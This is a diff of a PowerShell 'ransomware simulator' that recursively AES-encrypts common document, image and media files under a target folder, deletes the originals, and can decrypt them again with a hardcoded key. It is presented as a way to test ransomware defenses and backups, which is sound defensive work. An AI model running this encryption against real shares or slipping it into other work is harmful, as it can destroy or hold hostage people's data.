@@ -1,77 +1,63 @@
  <#
 
 .SYNOPSIS
-Ransomware Simulator that leverages AES symmetrical encryption to target specified file types based on defined starting path and all sub-directories. e.g. c:\fileshares
+    Ransomware Simulator using AES to recursively encrypt or decrypt files at a given path
 
 .DESCRIPTION
-This powershell script encrypts or decrypts files using a symmetrical key using AES encryption
+    This script is intended to be used to test your defenses and backups against ransomware in a controlled environment. You can encrypt fake data for
+your simulation, but you also have the option to decrypt the files with the same script if you need to.
 
 .EXAMPLE
-.\RanSim.ps1 -mode encrypt
-
-To decrypt encrypted files:
-.\RanSim.ps1 -mode decrypt 
+    .\RanSim.ps1 -mode encrypt
+    or
+    .\RanSim.ps1 -mode decrypt
 
 .PARAMETER Target File Path
-	Specify a the root directory that will be targeted along with sub-directories for file encryption.  Example c:\fileshares
+    This optional parameter specifies the path that the recursive encryption will start in. A default path is provided.
  
-.PARAMETER FilesTypes
-	This parameter is  mandatory, but can be adjusted to which file types to encrypt.  Wild cards are suppoorted for files such as *.doc* which will encryption .doc and .docx.
-		Office : Will generate files with the following extensions: "*.pptx","*.docx","*.doc","*.xls","*.rft","*.txt",".pdf","*.ppt",,"*.dot"
-		Multimedia : Will create random files with the following extensions : "*.avi","*.midi","*.mov","*.mp3","*.mp4","*.mpeg","*.mpeg2","*.mpeg3","*.mpg","*.ogg"
-
 .PARAMETER File Extension
-    This parameter is mandatory and defines what the encrypted files will be appended with once attacked.  Example .encrypted
+    This optional parameter defines the extension that will be added to the encrypted files once attacked. A default extension is provided.
 
 .PARAMETER Encryption key
-    This parameter is mandatory and is the plain-text AES encryption key used for both encryption and decryption.  A pre-defined key is provided.  A new key can be generated and replaced in the global variables.
+    This optional parameter is the plain-text AES encryption key used for both encryption and decryption. A default key is provided. 
 
 .NOTES
-The script will encrypt or decrypt from the file target path and all sub-directories below.  Encryption extension will be appended to encrypted files.
-You can choose which file types by extension will be encrypted in the global variables.
-
-Leverages FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
+    This script uses the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
 
 #>
 
-#declare our named parameters passed from command line
+# Define parameters and their defaults
 param([string]$Mode,
-      [string]$TargetPath = "C:\File Shares",
+      [string]$TargetPath = "C:\RanSim",
       [string]$Extension = ".encrypted",
-      [string]$Key = "S4Xe7C57wbNVgmUss7xUjJOoICLdaW1Zgrks4s1hN4E="
+      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
 )
 
-#==== global variables ===================================================================================
-#target file types
-$TargetFiles = '*.pdf','*.mp3','*.xls*','*.ppt*','*.doc*','*.accd*','*.mpg','*.mpeg','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif'
+# Define target file types
+$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
 
-
-#END ==== global variables ===============================================================================
-#do not edit below here
-
-#import crypto functions (assumes module is in the same folder as this script)
+# Import FileCryptography module
 Import-Module "$PSScriptRoot\FileCryptography.psm1"
 
 if ($mode -eq "encrypt") {
-    #find files to encrypt
-    $FilestoEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
+    # Gather all files from the target path and its subdirectories
+    $FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
+    $NumFiles = $FilesToEncrypt.length
 
-    #encrypt each file
-
-    foreach ($file in $FilestoEncrypt)
+    # Encrypt the files
+    foreach ($file in $FilesToEncrypt)
     {
         Write-Host "Encrypting $file"
         Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
     }
-    Write-Host "Encrypted all files." | Start-Sleep -Seconds 10
+    Write-Host "Encrypted $NumFiles files." | Start-Sleep -Seconds 10
 }
 
 elseif ($mode -eq "decrypt") {
-    #find files to decrypt
+    # Gather all files from the target path and its subdirectories
     $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | where { ! $_.PSIsContainer }
 
-    #encrypt each file
-
+    # Encrypt the files
     foreach ($file in $FilestoDecrypt)
     {
         Write-Host "Decrypting $file"
@@ -80,6 +66,6 @@ elseif ($mode -eq "decrypt") {
 } 
 
 else {
-    write-host "You need to specify a target mode - encrypt or decrypt. Example for encryption - .\ransim.ps1 -mode encrypt"
-} #END if
+    write-host "ERROR: must choose a mode (encrypt or decrypt). Example usage: .\RanSim.ps1 -mode encrypt"
+}
 exit 
